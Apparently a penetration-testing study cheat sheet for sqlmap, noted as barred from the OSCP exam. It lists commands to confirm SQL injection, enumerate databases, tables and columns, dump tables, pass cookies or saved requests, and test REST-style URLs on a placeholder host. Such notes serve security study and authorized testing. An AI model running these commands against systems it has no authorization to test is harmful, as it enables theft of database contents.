ATTENTION interdit pour l'OSCP

## SQLmap

Assuming you've tested a parameter with `'` and it is injectable, run SQL map against the URL:

```text
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --dbms=mysql
```

It may not run unless you specify the database type.

Get the databases:

```text
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --dbs --dbms=mysql
```

Get the tables in a database:

```text
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --tables -D [database name]
```

Get the columns in a table:

```text
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --columns -D [database name] -T [table name]
```

Dump a table:

```text
sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --dump -D [database name] -T [table name]
```

### Passing tokens

If the URL isn't accessible, you can pass cookie data or authentication credentials to SQLmap by pasting the post request in a file and using the `-r` option:

```text
sqlmap -r request.txt
```

If you just need to pass a cookie:

```text
sqlmap -u "http://[host]/inject.php" --cookie "PHPSESSID=foobar"
```

### REST-style URLs

If your URLs have no parameters, you can still test them:

```text
sqlmap -u "http://[host]/param1*/param2*"
```
